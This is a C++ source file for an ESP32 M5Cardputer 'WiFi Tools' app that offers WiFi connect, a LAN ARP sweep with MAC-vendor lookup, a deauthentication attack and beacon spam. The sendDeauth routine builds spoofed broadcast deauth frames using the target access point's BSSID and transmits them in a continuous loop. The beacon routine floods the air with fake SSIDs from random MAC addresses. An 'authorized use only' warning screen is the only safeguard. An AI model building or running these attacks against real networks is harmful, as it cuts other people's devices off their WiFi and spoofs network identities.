#include "app_wifi.h"
#include <M5Cardputer.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "lwip/etharp.h"
#include "lwip/netif.h"
#include "config.h"
#include "input.h"
#include "nav.h"
#include "wifi_mgr.h"

// ── State ──────────────────────────────────────────────────────────────────

enum class WifiToolState {
    MAIN_MENU,
    WIFI_SCAN, WIFI_PASSWORD,
    NET_RUNNING, NET_RESULTS,
    DEAUTH_SCAN, DEAUTH_SELECT, DEAUTH_WARN, DEAUTH_RUNNING,
    BEACON_RUNNING
};
static WifiToolState s_state = WifiToolState::MAIN_MENU;
static bool          s_dirty = true;
static int           s_menuSel = 0;
static int           s_scroll  = 0;
static bool          s_hadWifi = false;
static bool          s_beaconScreenDone = false;
static constexpr int MAX_SCAN = 20;
static String        s_scanSSID[MAX_SCAN];
static int           s_scanCount = 0;
static int           s_scanSel = 0;
static int           s_scanScroll = 0;
static String        s_wifiPassBuf;
static int           s_wifiPassCursor = 0;
static uint32_t      s_wifiPassEnteredAt = 0;

static void drawBar();  // forward declaration

// ── Network scan ───────────────────────────────────────────────────────────

struct NetDevice { uint8_t ip4; uint8_t mac[6]; char vendor[16]; };
static constexpr int MAX_DEVICES = 48;
static NetDevice s_devices[MAX_DEVICES];
static int       s_devCount = 0;
static uint8_t   s_netBase[3];   // first 3 octets of local subnet

struct OuiEntry { uint8_t prefix[3]; const char* name; };
static const OuiEntry OUI_TABLE[] = {
    {{0xB8,0x27,0xEB},"Raspberry Pi"}, {{0xDC,0xA6,0x32},"Raspberry Pi"}, {{0xE4,0x5F,0x01},"Raspberry Pi"},
    {{0xD8,0x3A,0xDD},"Apple"},        {{0xF4,0xF1,0x5A},"Apple"},        {{0xAC,0xBC,0x32},"Apple"},
    {{0x00,0x23,0x14},"Apple"},        {{0xA4,0xC3,0xF0},"Apple"},        {{0x8C,0x85,0x90},"Apple"},
    {{0x40,0xB4,0xCD},"Amazon"},       {{0x68,0x37,0xE9},"Amazon"},       {{0x74,0xC2,0x46},"Amazon"},
    {{0xAC,0x63,0xBE},"Amazon"},       {{0xFC,0x65,0xDE},"Amazon"},
    {{0x54,0x60,0x09},"Google"},       {{0xF4,0xF5,0xD8},"Google"},       {{0x20,0xDF,0xB9},"Google"},
    {{0x50,0xC7,0xBF},"TP-Link"},      {{0x14,0xCC,0x20},"TP-Link"},      {{0xA4,0x2B,0xB0},"TP-Link"},
    {{0xC4,0x04,0x15},"Netgear"},      {{0xA0,0x40,0xA0},"Netgear"},
    {{0x00,0x50,0xF2},"Microsoft"},    {{0xB8,0x86,0x87},"Intel"},        {{0x8C,0x8D,0x28},"Intel"},
    {{0x24,0x0A,0xC4},"Espressif"},    {{0x30,0xAE,0xA4},"Espressif"},    {{0x84,0xF3,0xEB},"Espressif"},
    {{0x24,0x6F,0x28},"Espressif"},    {{0xA0,0x20,0xA6},"Espressif"},
    {{0x00,0x00,0x0C},"Cisco"},        {{0x00,0x1A,0xA2},"Cisco"},
    {{0x00,0x15,0x99},"Samsung"},      {{0x00,0x21,0x19},"Samsung"},      {{0x50,0xEC,0x50},"Xiaomi"},
    {{0x28,0x6C,0x07},"Xiaomi"},       {{0x00,0x11,0x2F},"ASUS"},         {{0x04,0x92,0x26},"ASUS"},
    {{0x00,0x0C,0x29},"VMware"},       {{0x08,0x00,0x27},"VirtualBox"},
};
static constexpr int N_OUI = (int)(sizeof(OUI_TABLE)/sizeof(OUI_TABLE[0]));

static const char* lookupOui(const uint8_t* mac) {
    for (int i = 0; i < N_OUI; i++)
        if (memcmp(mac, OUI_TABLE[i].prefix, 3) == 0) return OUI_TABLE[i].name;
    return "Unknown";
}

static void runNetScan() {
    s_devCount = 0;
    auto& d = M5Cardputer.Display;

    IPAddress lip = WiFi.localIP();
    s_netBase[0]=lip[0]; s_netBase[1]=lip[1]; s_netBase[2]=lip[2];

    struct netif* ni = netif_default;
    if (!ni) { s_state=WifiToolState::MAIN_MENU; s_dirty=true; return; }

    // LwIP ARP table holds ~10 entries. Scan in batches of 8 so we can read
    // each batch's replies before they get evicted by the next batch.
    constexpr int BATCH    = 8;
    constexpr int BATCH_MS = 220;
    constexpr int TOTAL    = 254;
    int batches = (TOTAL + BATCH - 1) / BATCH;

    for (int b = 0; b < batches && s_devCount < MAX_DEVICES; b++) {
        int base = b * BATCH + 1;
        int end  = min(base + BATCH, 255);

        d.fillScreen(C_BG); drawBar();
        d.setFont(&fonts::Font0); d.setTextSize(2); d.setTextColor(C_FG, C_BG);
        const char* lbl = "Scanning LAN";
        d.setCursor((SCREEN_W-(int)strlen(lbl)*FONT_W*2)/2, 22); d.print(lbl);
        d.setTextSize(1); d.setTextColor(C_DIM, C_BG);
        char info[44]; snprintf(info,sizeof(info),"ARP .%d-%d  found: %d", base, end-1, s_devCount);
        d.setCursor(4, 50); d.print(info);
        int bw = (SCREEN_W-8)*(b+1)/batches;
        d.drawRect(4,62,SCREEN_W-8,8,C_DIM);
        if (bw>2) d.fillRect(5,63,bw-2,6,0x0055AA);
        d.setCursor(4,SCREEN_H-10); d.print("Please wait...");

        for (int i = base; i < end; i++) {
            if (i == (int)lip[3]) continue;
            ip4_addr_t tgt;
            IP4_ADDR(&tgt,(uint8_t)s_netBase[0],(uint8_t)s_netBase[1],(uint8_t)s_netBase[2],(uint8_t)i);
            etharp_request(ni, &tgt);
        }
        delay(BATCH_MS);

        for (int i = base; i < end && s_devCount < MAX_DEVICES; i++) {
            if (i == (int)lip[3]) continue;
            ip4_addr_t tgt;
            IP4_ADDR(&tgt,(uint8_t)s_netBase[0],(uint8_t)s_netBase[1],(uint8_t)s_netBase[2],(uint8_t)i);
            struct eth_addr* eth = nullptr;
            const ip4_addr_t* ipr = nullptr;
            if (etharp_find_addr(ni, &tgt, &eth, &ipr) >= 0 && eth) {
                auto& dev = s_devices[s_devCount++];
                dev.ip4 = (uint8_t)i;
                memcpy(dev.mac, eth->addr, 6);
                strncpy(dev.vendor, lookupOui(eth->addr), 15);
                dev.vendor[15] = '\0';
            }
        }
    }
}

// ── Deauth attack ──────────────────────────────────────────────────────────

struct ApTarget { char ssid[33]; char bssid[18]; uint8_t bssidBytes[6]; uint8_t ch; int rssi; };
static constexpr int MAX_TARGETS = 24;
static ApTarget  s_targets[MAX_TARGETS];
static int       s_tgtCount  = 0;
static int       s_tgtSel    = 0;
static uint32_t  s_deauthCount = 0;

static void scanForTargets() {
    s_tgtCount = 0;
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    d.fillRect(0,0,SCREEN_W,STATUS_H,C_STATUS_BG);
    d.setFont(&fonts::Font0); d.setTextSize(1);
    d.setTextColor(C_STATUS_FG,C_STATUS_BG); d.setCursor(2,3); d.print("WiFi Tools");
    d.setTextSize(2); d.setTextColor(C_FG,C_BG);
    const char* msg="Scanning APs...";
    d.setCursor((SCREEN_W-(int)strlen(msg)*FONT_W*2)/2,50); d.print(msg);

    WiFi.mode(WIFI_STA);
    int n = WiFi.scanNetworks(false, false);
    int stored = min(n, MAX_TARGETS);
    for (int i = 0; i < stored; i++) {
        auto& t = s_targets[s_tgtCount++];
        String ssid = WiFi.SSID(i);
        strncpy(t.ssid, ssid.c_str(), 32); t.ssid[32]='\0';
        String bssid = WiFi.BSSIDstr(i);
        strncpy(t.bssid, bssid.c_str(), 17); t.bssid[17]='\0';
        uint8_t* b = WiFi.BSSID(i); if (b) memcpy(t.bssidBytes, b, 6);
        t.ch   = (uint8_t)WiFi.channel(i);
        t.rssi = WiFi.RSSI(i);
    }
    WiFi.scanDelete();
    // Sort by RSSI
    for (int i=0;i<s_tgtCount-1;i++)
        for (int j=0;j<s_tgtCount-1-i;j++)
            if (s_targets[j].rssi<s_targets[j+1].rssi) { ApTarget tmp=s_targets[j]; s_targets[j]=s_targets[j+1]; s_targets[j+1]=tmp; }
}

static void sendDeauth(const ApTarget& t) {
    uint8_t frame[26];
    frame[0]=0xC0; frame[1]=0x00;          // Frame control: deauth
    frame[2]=0x00; frame[3]=0x00;           // Duration
    memset(frame+4,  0xFF, 6);              // DA: broadcast
    memcpy(frame+10, t.bssidBytes, 6);      // SA: spoofed as AP
    memcpy(frame+16, t.bssidBytes, 6);      // BSSID
    frame[22]=0x00; frame[23]=0x00;         // Sequence
    frame[24]=0x07; frame[25]=0x00;         // Reason: Class 3 from nonassoc STA
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
}

// ── Beacon spam ────────────────────────────────────────────────────────────

static const char* const BEACON_SSIDS[] = {
    "FBI Surveillance Van",
    "Not a Trap",
    "404 Network Unavailable",
    "Pretty Fly for a WiFi",
    "The LAN Before Time",
    "Silence of the LANs",
    "Tell My WiFi Love Her",
    "It Hurts When IP",
    "Nacho WiFi",
    "Router? I Barely Know Her",
    "Loading...",
    "Hack Me If You Can",
    "Definitely Not Skynet",
    "Abraham Linksys",
    "Martin Router King",
    "No More Mr. WiFi",
    "Bill Wi the Science Fi",
    "Test Network Alpha",
    "Test Network Beta",
    "Test Network Gamma",
};
static constexpr int N_BEACON_SSIDS = (int)(sizeof(BEACON_SSIDS)/sizeof(BEACON_SSIDS[0]));
static uint32_t s_beaconCount = 0;
static int      s_beaconIdx   = 0;

static void buildBeacon(uint8_t* frame, int* len, const char* ssid, const uint8_t* mac, uint8_t ch) {
    uint8_t sl = (uint8_t)strnlen(ssid, 32);
    int o = 0;
    frame[o++]=0x80; frame[o++]=0x00;          // Frame control: beacon
    frame[o++]=0x00; frame[o++]=0x00;           // Duration
    memset(frame+o, 0xFF, 6); o+=6;             // DA: broadcast
    memcpy(frame+o, mac, 6);  o+=6;             // SA
    memcpy(frame+o, mac, 6);  o+=6;             // BSSID
    frame[o++]=0x00; frame[o++]=0x00;           // Sequence
    memset(frame+o, 0x00, 8); o+=8;             // Timestamp
    frame[o++]=0x64; frame[o++]=0x00;           // Beacon interval: 100 TUs
    frame[o++]=0x31; frame[o++]=0x04;           // Capability: ESS + Privacy
    frame[o++]=0x00; frame[o++]=sl;             // SSID tag
    memcpy(frame+o, ssid, sl); o+=sl;
    frame[o++]=0x01; frame[o++]=0x08;           // Supported rates
    frame[o++]=0x82; frame[o++]=0x84; frame[o++]=0x8B; frame[o++]=0x96;
    frame[o++]=0x24; frame[o++]=0x30; frame[o++]=0x48; frame[o++]=0x6C;
    frame[o++]=0x03; frame[o++]=0x01; frame[o++]=ch;   // DS param set
    *len = o;
}

static uint8_t randMac[6];
static void genMac() {
    for (int i=0;i<6;i++) randMac[i]=(uint8_t)(esp_random()&0xFF);
    randMac[0]=(randMac[0]&0xFE)|0x02;  // locally administered, unicast
}

// ── Display ────────────────────────────────────────────────────────────────

static void updateBeaconCounterOnly() {
    auto& d = M5Cardputer.Display;
    d.setFont(&fonts::Font0); d.setTextSize(1);
    d.setTextColor(C_DIM, C_BG);
    char cur[36]; snprintf(cur,sizeof(cur),"SSID: %-28s",BEACON_SSIDS[s_beaconIdx]);
    d.setCursor(4,44); d.print(cur);
    d.setTextSize(3);
    d.fillRect(0,66,SCREEN_W,28,C_BG);
    d.setTextColor(0xFF8800,C_BG);
    char cnt[12]; snprintf(cnt,sizeof(cnt),"%lu",(unsigned long)s_beaconCount);
    d.setCursor((SCREEN_W-(int)strlen(cnt)*FONT_W*3)/2,72); d.print(cnt);
    d.setTextSize(1);
}

static void drawBar() {
    auto& d = M5Cardputer.Display;
    d.fillRect(0,0,SCREEN_W,STATUS_H,C_STATUS_BG);
    d.setFont(&fonts::Font0); d.setTextSize(1);
    d.setTextColor(C_STATUS_FG,C_STATUS_BG); d.setCursor(2,3); d.print("WiFi Tools");
    drawBatteryWidget(C_STATUS_BG, SCREEN_W-43);
}

static const char* MENU_LABELS[4]={"WiFi Connect","LAN Scan","Deauth Attack","Beacon Spam"};
static const char* MENU_DESC[4]={
    "Scan APs and connect",
    "ARP sweep, find all LAN devices",
    "Deauth clients from target AP",
    "Flood area with fake SSIDs"
};
static const uint32_t MENU_COLS[4]={0x224488,0x0055AA,0xFF3300,0xFF8800};

static constexpr int LIST_VISIBLE = 11;

static void doWifiScan() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawBar();
    d.setFont(&fonts::Font0);
    d.setTextSize(1);
    d.setTextColor(C_FG, C_BG);
    d.setCursor(4, STATUS_H + 20);
    d.print("Scanning...");
    WiFi.persistent(false);
    WiFi.disconnect(true, true);
    delay(120);
    WiFi.mode(WIFI_STA);
    int n = WiFi.scanNetworks();
    s_scanCount = 0;
    if (n > 0) {
        s_scanCount = (n > MAX_SCAN) ? MAX_SCAN : n;
        for (int i = 0; i < s_scanCount; i++) s_scanSSID[i] = WiFi.SSID(i);
        WiFi.scanDelete();
    }
    s_scanSel = 0;
    s_scanScroll = 0;
}

static void drawWifiScan() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawBar();
    d.setFont(&fonts::Font0);
    d.setTextSize(1);

    if (s_scanCount == 0) {
        d.setTextColor(C_DIM, C_BG);
        d.setCursor(4, STATUS_H + 10);
        d.print("No networks found.");
    } else {
        for (int i = 0; i < LIST_VISIBLE; i++) {
            int idx = i + s_scanScroll;
            if (idx >= s_scanCount) break;
            bool sel = (idx == s_scanSel);
            int y = STATUS_H + i * (FONT_H + 2);
            uint32_t bg = sel ? C_HIGHLIGHT : (uint32_t)C_BG;
            d.fillRect(0, y, SCREEN_W, FONT_H + 2, bg);
            d.setTextColor(sel ? (uint32_t)C_INPUT : (uint32_t)C_FG, bg);
            d.setCursor(4, y + 1);
            d.print(s_scanSSID[idx].c_str());
        }
    }
    d.setTextColor(C_DIM, C_BG);
    d.setCursor(2, SCREEN_H - 10);
    d.print("up/dn nav  Enter=sel  fn+D=disc");
}

static void drawWifiPassword() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    drawBar();
    d.setFont(&fonts::Font0);
    d.setTextSize(1);

    d.fillRoundRect(6, STATUS_H + 4, SCREEN_W - 12, 54, 5, 0x1D2A3A);
    d.drawRoundRect(6, STATUS_H + 4, SCREEN_W - 12, 54, 5, 0x66CCFF);
    d.setTextColor(0x66CCFF, 0x1D2A3A);
    d.setCursor(12, STATUS_H + 10);
    d.print("ENTER WIFI PASSWORD");

    d.setTextColor(C_FG, C_BG);
    char buf[64];
    snprintf(buf, sizeof(buf), "SSID: %.32s", s_scanSSID[s_scanSel].c_str());
    d.setTextColor(C_FG, 0x1D2A3A);
    d.setCursor(12, STATUS_H + 24);
    d.print(buf);

    constexpr int passX = 12 + 6 * FONT_W;
    d.setTextColor(C_DIM, 0x1D2A3A);
    d.setCursor(12, STATUS_H + 40);
    d.print("Pass: ");
    d.setTextColor(C_FG, 0x1D2A3A);
    for (char ch : s_wifiPassBuf) d.print('*');
    d.fillRect(passX + s_wifiPassCursor * FONT_W, STATUS_H + 40, FONT_W, FONT_H, C_INPUT);

    d.setTextColor(C_DIM, C_BG);
    d.setCursor(8, SCREEN_H - 10);
    d.print("Type pass  Enter=connect  bksp=back");
}

static void drawMainMenu() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG); drawBar();
    d.setFont(&fonts::Font0); d.setTextSize(1);
    for (int i=0;i<4;i++) {
        int y=15+i*28;
        bool sel=(i==s_menuSel);
        uint32_t col=MENU_COLS[i];
        if (sel) { d.fillRoundRect(2,y,SCREEN_W-4,26,4,col); d.setTextColor(0x000000,col); }
        else      { d.drawRoundRect(2,y,SCREEN_W-4,26,4,col); d.setTextColor(col,C_BG); }
        d.setTextSize(1); d.setCursor(10,y+4); d.print(MENU_LABELS[i]);
        d.setTextSize(1);
        d.setTextColor(sel?(uint32_t)0x222222:(uint32_t)C_DIM, sel?col:(uint32_t)C_BG);
        d.setCursor(10,y+14); d.print(MENU_DESC[i]);
    }
    d.setTextColor(C_DIM,C_BG); d.setCursor(2,SCREEN_H-10);
    d.print("up/dn=select  Enter=start  fn+bksp=back");
}

static void drawNetResults() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG); drawBar();
    d.setFont(&fonts::Font0); d.setTextSize(1);
    if (s_devCount == 0) {
        d.setTextColor(C_DIM,C_BG); d.setCursor(4,40);
        d.print("No devices found."); d.setCursor(4,52);
        d.print("Make sure you are connected to WiFi.");
    } else {
        // Header
        d.setTextColor(C_DIM,C_BG); d.setCursor(0,STATUS_H+1);
        d.print("IP           MAC               Vendor");
        d.drawFastHLine(0,STATUS_H+10,SCREEN_W,C_DIM);
        constexpr int ROW_H=11, ROWS=(SCREEN_H-STATUS_H-24)/ROW_H;
        for (int i=0;i<ROWS&&(s_scroll+i)<s_devCount;i++) {
            const auto& dev=s_devices[s_scroll+i]; int y=STATUS_H+12+i*ROW_H;
            // IP last octet
            d.setTextColor(C_FG,C_BG);
            char ip[18]; snprintf(ip,sizeof(ip),"%d.%d.%d.%d",s_netBase[0],s_netBase[1],s_netBase[2],dev.ip4);
            d.setCursor(0,y); d.print(ip);
            // MAC (short: last 3 octets)
            d.setTextColor(0x888888,C_BG);
            char mac[10]; snprintf(mac,sizeof(mac),"%02X:%02X:%02X",dev.mac[3],dev.mac[4],dev.mac[5]);
            d.setCursor(78,y); d.print(mac);
            // Vendor
            d.setTextColor(0x00AAFF,C_BG);
            d.setCursor(138,y); d.print(dev.vendor);
        }
        d.setTextColor(C_DIM,C_BG);
        char foot[40]; snprintf(foot,sizeof(foot),"%d devices  up/dn  Enter=rescan",s_devCount);
        d.setCursor(2,SCREEN_H-10); d.print(foot);
    }
}

static void drawDeauthSelect() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG); drawBar();
    d.setFont(&fonts::Font0); d.setTextSize(1);
    if (s_tgtCount == 0) {
        d.setTextColor(C_DIM,C_BG); d.setCursor(4,60); d.print("No APs found.");
        d.setCursor(4,72); d.print("Enter=rescan  fn+bksp=menu");
        return;
    }
    d.setTextColor(C_DIM,C_BG); d.setCursor(2,STATUS_H+1); d.print("Select target  Enter=attack  bksp=back");
    constexpr int ROW_H=13, ROWS=(SCREEN_H-STATUS_H-22)/ROW_H;
    for (int i=0;i<ROWS&&(s_scroll+i)<s_tgtCount;i++) {
        const auto& t=s_targets[s_scroll+i]; int y=STATUS_H+12+i*ROW_H;
        bool sel=((s_scroll+i)==s_tgtSel);
        if (sel) d.fillRect(0,y,SCREEN_W,ROW_H-1,0x222200);
        d.setTextColor(sel?(uint32_t)0xFFFF00:(uint32_t)C_FG,sel?(uint32_t)0x222200:(uint32_t)C_BG);
        char row[42]; snprintf(row,sizeof(row),"CH%2d %4ddBm %-21s",t.ch,t.rssi,t.ssid);
        d.setCursor(2,y+2); d.print(row);
    }
    d.setTextColor(C_DIM,C_BG); d.setCursor(2,SCREEN_H-10);
    d.print("up/dn=scroll  Enter=select");
}

static void drawDeauthWarn() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG); drawBar();
    d.setFont(&fonts::Font0); d.setTextSize(1);
    d.setTextColor(0xFF3333,C_BG); d.setTextSize(2);
    d.setCursor(30,18); d.print("! WARNING !");
    d.setTextSize(1); d.setTextColor(0xFFAA00,C_BG);
    d.setCursor(4,40); d.print("AUTHORIZED USE ONLY.");
    d.setCursor(4,52); d.print("Only test networks you own or");
    d.setCursor(4,62); d.print("have explicit written permission.");
    d.setCursor(4,74); d.print("Unauthorized deauth is illegal");
    d.setCursor(4,84); d.print("in most jurisdictions.");
    d.setTextColor(0xFFFF00,C_BG);
    d.setCursor(4,100); d.print("Target: "); d.print(s_targets[s_tgtSel].ssid);
    d.setTextColor(C_DIM,C_BG);
    d.setCursor(4,116); d.print("[Enter]=proceed  [fn+bksp]=cancel");
}

static void drawDeauthRunning() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG); drawBar();
    d.setFont(&fonts::Font0); d.setTextSize(1);
    d.setTextColor(0xFF3333,C_BG); d.setTextSize(2);
    const char* atk="DEAUTHING";
    d.setCursor((SCREEN_W-(int)strlen(atk)*FONT_W*2)/2,18); d.print(atk);
    d.setTextSize(1);
    d.setTextColor(C_DIM,C_BG); d.setCursor(4,44);
    char tgt[36]; snprintf(tgt,sizeof(tgt),"Target: %-26s",s_targets[s_tgtSel].ssid);
    d.print(tgt);
    d.setCursor(4,56);
    char ch[20]; snprintf(ch,sizeof(ch),"CH:%d  BSSID:%s",s_targets[s_tgtSel].ch,s_targets[s_tgtSel].bssid);
    d.print(ch);
    d.setTextColor(0xFF3333,C_BG); d.setTextSize(3);
    char cnt[12]; snprintf(cnt,sizeof(cnt),"%lu",(unsigned long)s_deauthCount);
    d.setCursor((SCREEN_W-(int)strlen(cnt)*FONT_W*3)/2,74); d.print(cnt);
    d.setTextSize(1); d.setTextColor(C_DIM,C_BG);
    d.setCursor(4,108); d.print("frames sent");
    d.setCursor(4,SCREEN_H-10); d.print("fn+bksp = stop");
}

static void drawBeaconRunning() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG); drawBar();
    d.setFont(&fonts::Font0); d.setTextSize(1);
    d.setTextColor(0xFF8800,C_BG); d.setTextSize(2);
    const char* lbl="BEACON SPAM";
    d.setCursor((SCREEN_W-(int)strlen(lbl)*FONT_W*2)/2,18); d.print(lbl);
    d.setTextSize(1);
    d.setTextColor(C_DIM,C_BG); d.setCursor(4,44);
    char cur[36]; snprintf(cur,sizeof(cur),"SSID: %-28s",BEACON_SSIDS[s_beaconIdx]);
    d.print(cur);
    d.setCursor(4,56);
    char uniq[28]; snprintf(uniq,sizeof(uniq),"Cycling %d fake SSIDs",N_BEACON_SSIDS);
    d.print(uniq);
    d.setTextColor(0xFF8800,C_BG); d.setTextSize(3);
    char cnt[12]; snprintf(cnt,sizeof(cnt),"%lu",(unsigned long)s_beaconCount);
    d.setCursor((SCREEN_W-(int)strlen(cnt)*FONT_W*3)/2,72); d.print(cnt);
    d.setTextSize(1); d.setTextColor(C_DIM,C_BG);
    d.setCursor(4,106); d.print("beacons sent");
    d.setCursor(4,SCREEN_H-10); d.print("fn+bksp = stop");
}

// ── Helpers ────────────────────────────────────────────────────────────────

static void setupRawTx() {
    s_hadWifi = (WiFi.status() == WL_CONNECTED);
    WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(80);
    esp_wifi_set_promiscuous(true);
}

static void stopRawTx() {
    esp_wifi_set_promiscuous(false);
    if (s_hadWifi) { WiFi.reconnect(); }
    else { WiFi.mode(WIFI_OFF); }
}

// ── Public ─────────────────────────────────────────────────────────────────

void appWifiEnter() {
    s_state   = WifiToolState::MAIN_MENU;
    s_dirty   = true;
    s_menuSel = 0;
    s_scroll  = 0;
}

void appWifiLoop() {
    // ── Deauth running ────────────────────────────────────────────────────
    if (s_state == WifiToolState::DEAUTH_RUNNING) {
        sendDeauth(s_targets[s_tgtSel]);
        s_deauthCount++;
        if (s_deauthCount % 20 == 0) drawDeauthRunning();
        auto ev = readKeys();
        if (ev.changed && ev.back) {
            stopRawTx();
            s_deauthCount = 0;
            s_state = WifiToolState::MAIN_MENU;
            s_dirty = true;
        }
        return;
    }

    // ── Beacon running ────────────────────────────────────────────────────
    if (s_state == WifiToolState::BEACON_RUNNING) {
        uint8_t frame[128]; int flen=0;
        genMac();
        buildBeacon(frame, &flen, BEACON_SSIDS[s_beaconIdx], randMac, 6);
        esp_wifi_80211_tx(WIFI_IF_STA, frame, flen, false);
        s_beaconCount++;
        s_beaconIdx = (s_beaconIdx + 1) % N_BEACON_SSIDS;
        if (!s_beaconScreenDone) { drawBeaconRunning(); s_beaconScreenDone = true; }
        else if (s_beaconCount % 20 == 0) updateBeaconCounterOnly();
        auto ev = readKeys();
        if (ev.changed && ev.back) {
            stopRawTx();
            s_beaconCount = 0;
            s_beaconIdx   = 0;
            s_state = WifiToolState::MAIN_MENU;
            s_dirty = true;
        }
        return;
    }

    if (s_dirty) {
        switch (s_state) {
            case WifiToolState::MAIN_MENU:     drawMainMenu();     break;
            case WifiToolState::WIFI_SCAN:     drawWifiScan();     break;
            case WifiToolState::WIFI_PASSWORD: drawWifiPassword(); break;
            case WifiToolState::NET_RESULTS:   drawNetResults();   break;
            case WifiToolState::DEAUTH_SELECT: drawDeauthSelect(); break;
            case WifiToolState::DEAUTH_WARN:   drawDeauthWarn();   break;
            default: break;
        }
        s_dirty = false;
    }

    auto ev = readKeys();
    if (!ev.changed) return;

    switch (s_state) {
        case WifiToolState::MAIN_MENU:
            if (ev.back)  { goHome(); return; }
            if (ev.up   && s_menuSel > 0) { s_menuSel--; s_dirty=true; }
            if (ev.down && s_menuSel < 3) { s_menuSel++; s_dirty=true; }
            if (ev.enter) {
                s_scroll = 0;
                if (s_menuSel == 0) {
                    doWifiScan();
                    s_state = WifiToolState::WIFI_SCAN;
                    s_dirty = true;
                } else if (s_menuSel == 1) {
                    if (WiFi.status() != WL_CONNECTED) {
                        auto& d=M5Cardputer.Display; d.fillScreen(C_BG); drawBar();
                        d.setFont(&fonts::Font0); d.setTextSize(1);
                        d.setTextColor(C_ERROR,C_BG); d.setCursor(4,50);
                        d.print("Not connected to WiFi."); d.setCursor(4,62);
                        d.print("Use WiFi Connect first.");
                        delay(2000); s_dirty=true; break;
                    }
                    runNetScan();
                    s_state = WifiToolState::NET_RESULTS;
                    s_dirty = true;
                } else if (s_menuSel == 2) {
                    scanForTargets();
                    s_tgtSel = 0;
                    s_state  = WifiToolState::DEAUTH_SELECT;
                    s_dirty  = true;
                } else {
                    setupRawTx();
                    s_beaconCount=0; s_beaconIdx=0; s_beaconScreenDone=false;
                    s_state = WifiToolState::BEACON_RUNNING;
                }
            }
            break;

        case WifiToolState::WIFI_SCAN:
            if (s_dirty) { drawWifiScan(); s_dirty = false; }
            if (ev.back) { s_state = WifiToolState::MAIN_MENU; s_dirty = true; break; }
            if (ev.fnKey) {
                for (char c : ev.chars) {
                    if (c == 'd' || c == 'D') {
                        WifiMgr.disconnect();
                        s_dirty = true;
                        break;
                    }
                }
            }
            if (ev.enter && s_scanCount > 0) {
                s_wifiPassBuf = "";
                s_wifiPassCursor = 0;
                s_wifiPassEnteredAt = millis();
                s_state = WifiToolState::WIFI_PASSWORD;
                s_dirty = true;
                break;
            }
            if (ev.up && s_scanSel > 0) {
                s_scanSel--;
                if (s_scanSel < s_scanScroll) s_scanScroll = s_scanSel;
                s_dirty = true;
            }
            if (ev.down && s_scanSel < s_scanCount - 1) {
                s_scanSel++;
                if (s_scanSel >= s_scanScroll + LIST_VISIBLE) s_scanScroll = s_scanSel - LIST_VISIBLE + 1;
                s_dirty = true;
            }
            break;

        case WifiToolState::WIFI_PASSWORD:
            if (s_dirty) { drawWifiPassword(); s_dirty = false; }
            if (ev.back) { s_state = WifiToolState::WIFI_SCAN; s_dirty = true; break; }
            if (millis() - s_wifiPassEnteredAt < 250) {
                break;
            }
            if (ev.del && s_wifiPassCursor > 0) {
                s_wifiPassBuf.remove(s_wifiPassCursor - 1, 1);
                s_wifiPassCursor--;
                s_dirty = true;
                break;
            }
            if (!ev.fnKey) {
                for (char c : ev.chars) {
                    s_wifiPassBuf = s_wifiPassBuf.substring(0, s_wifiPassCursor) + c + s_wifiPassBuf.substring(s_wifiPassCursor);
                    s_wifiPassCursor++;
                }
                if (ev.chars.length() > 0) { s_dirty = true; break; }
            }
            if (ev.enter) {
                auto& d = M5Cardputer.Display;
                d.fillScreen(C_BG); drawBar();
                d.setFont(&fonts::Font0); d.setTextSize(1); d.setTextColor(C_FG, C_BG);
                char buf[64];
                snprintf(buf, sizeof(buf), "Connecting to %s", s_scanSSID[s_scanSel].c_str());
                d.setCursor(4, STATUS_H + 20); d.print(buf);
                WifiState r = WifiMgr.connect(s_scanSSID[s_scanSel], s_wifiPassBuf);
                d.setCursor(4, STATUS_H + 36);
                if (r == WifiState::CONNECTED) {
                    d.setTextColor((uint32_t)0x00CC00, C_BG);
                    snprintf(buf, sizeof(buf), "Connected! %s", WifiMgr.localIP().c_str());
                } else {
                    d.setTextColor(C_ERROR, C_BG);
                    snprintf(buf, sizeof(buf), "Failed to connect.");
                }
                d.print(buf);
                delay(1400);
                s_state = WifiToolState::WIFI_SCAN;
                s_dirty = true;
            }
            break;

        case WifiToolState::NET_RESULTS:
            if (ev.back)  { s_state=WifiToolState::MAIN_MENU; s_dirty=true; }
            if (ev.up   && s_scroll>0)           { s_scroll--; s_dirty=true; }
            if (ev.down && s_scroll<s_devCount-1){ s_scroll++; s_dirty=true; }
            if (ev.enter) { runNetScan(); s_scroll=0; s_dirty=true; }
            break;

        case WifiToolState::DEAUTH_SELECT:
            if (ev.back)  { s_state=WifiToolState::MAIN_MENU; s_dirty=true; }
            if (ev.up && s_tgtSel>0) {
                s_tgtSel--;
                if (s_tgtSel < s_scroll) s_scroll=s_tgtSel;
                s_dirty=true;
            }
            if (ev.down && s_tgtSel<s_tgtCount-1) {
                s_tgtSel++;
                constexpr int ROWS=(SCREEN_H-STATUS_H-22)/13;
                if (s_tgtSel >= s_scroll+ROWS) s_scroll=s_tgtSel-ROWS+1;
                s_dirty=true;
            }
            if (ev.enter) { s_state=WifiToolState::DEAUTH_WARN; s_dirty=true; }
            break;

        case WifiToolState::DEAUTH_WARN:
            if (ev.back) { s_state=WifiToolState::DEAUTH_SELECT; s_dirty=true; }
            if (ev.enter) {
                setupRawTx();
                esp_wifi_set_channel(s_targets[s_tgtSel].ch, WIFI_SECOND_CHAN_NONE);
                s_deauthCount=0;
                s_state=WifiToolState::DEAUTH_RUNNING;
            }
            break;

        default: break;
    }
}
